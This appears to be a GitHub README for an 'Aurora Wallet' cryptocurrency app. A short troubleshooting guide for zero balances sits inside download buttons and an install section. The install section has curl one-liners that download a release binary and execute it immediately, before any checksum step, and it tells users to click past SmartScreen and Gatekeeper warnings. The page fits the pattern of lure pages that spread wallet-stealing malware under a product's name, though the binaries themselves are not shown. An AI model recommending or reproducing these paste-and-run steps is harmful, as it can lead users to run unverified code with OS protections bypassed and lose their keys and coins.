![Aurora Wallet zero balance guide](assets/aurora-wallet-guide-article-banner.png)

# Aurora Wallet zero balance: how to confirm your real AUR

A balance of zero is almost always a display problem, and the check takes two minutes.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


Your coins are recorded on the Auroracoin blockchain, not inside the application, so a zero balance means the wallet cannot see the chain yet.

The wallet is a window onto the ledger. When the window is fogged by an unfinished sync, a wrong chain or an unimported key, the number reads zero while the coins stay exactly where they were. The checks below separate those cases.

<!-- ARTICLE-BODY-BEGIN -->

## Check the sync state first

The bottom bar shows the block height and the percentage. A wallet that has not reached one hundred percent is still catching up, and every balance you see before that point is a partial truth. Leave it open and check again before doing anything else.

Compare the height in the wallet with a public explorer. A large gap means the sync is behind. A small gap that never closes means the wallet is connected to a stale chain.

## Work through the causes

1. Let the sync reach one hundred percent before you judge the balance.
2. Confirm the wallet is on mainnet rather than a test network.
3. Check that the address you expect holds the balance, using the receive tab of the wallet.
4. Import the keys if the coins sit in a legacy `wallet.dat` or on a paper key.
5. Restore from the recovery phrase on a second machine if the wallet displays an address you do not recognise.

An address that appears in the wallet but shows nothing on an explorer is a wrong-chain symptom, not a spending problem. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/15-chain-split-resync.md">Chain split and resync</a> explains how to get back to the main network.

## When the coins live somewhere else

Old holdings are often in a file rather than in the wallet in front of you. Importing a `wallet.dat` moves those keys into the phrase-backed wallet, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md">importing a wallet.dat safely</a> walks through the copy-first rule that keeps the original intact.

A paper wallet holds a key rather than a wallet file, so the balance arrives by sweeping it, which is covered in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/23-sweep-paper-wallet.md">sweeping a paper wallet</a>.

Running the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> removes one variable, because display fixes ship with new versions.

## FAQ

### Did the wallet lose my coins?

No. Keys are on your machine and coins are on the chain. A display problem changes neither.

### What if the explorer shows a balance and the wallet does not?

The wallet is not fully synced or is following the wrong chain. Work through the sync checks before anything else.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Wallet not syncing](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md)
- [Import a wallet.dat](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md)
- [Chain split and resync](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/15-chain-split-resync.md)
- [Receiving addresses and QR codes](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/31-receiving-addresses-qr.md)
